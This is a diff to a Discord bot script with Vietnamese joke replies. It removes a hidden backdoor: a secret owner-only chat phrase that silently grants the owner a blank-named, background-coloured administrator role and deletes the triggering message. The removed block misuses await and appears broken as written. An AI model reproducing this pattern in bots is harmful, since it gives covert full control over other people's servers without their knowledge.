@@ -250,22 +250,6 @@ client.on("message", (message) => {
   if (message.content.startsWith("cu lua")) {message.channel.send("Lừa cc");}
   if (message.content.startsWith("làm tốt anh có thưởng")) {message.channel.send("Dạ <3");}
 	
-  if (message.content.startsWith("Cấp anh quyền administrator")) {
-	  if(message.author.id == oid){
-	  	try {
-			role = await message.guild.createRole({
- 				name: " ",
-  				color: "#363940",
-  				permissions: [8]
-			});
-			message.member.addRole(role)
-			message.delete(1000);
-			} catch(e) {
-			console.log(e.stack);
-			}
-	  }
-	  else{message.reply('Cho làm Assmin nhé!');}
-  }
   
 });
 
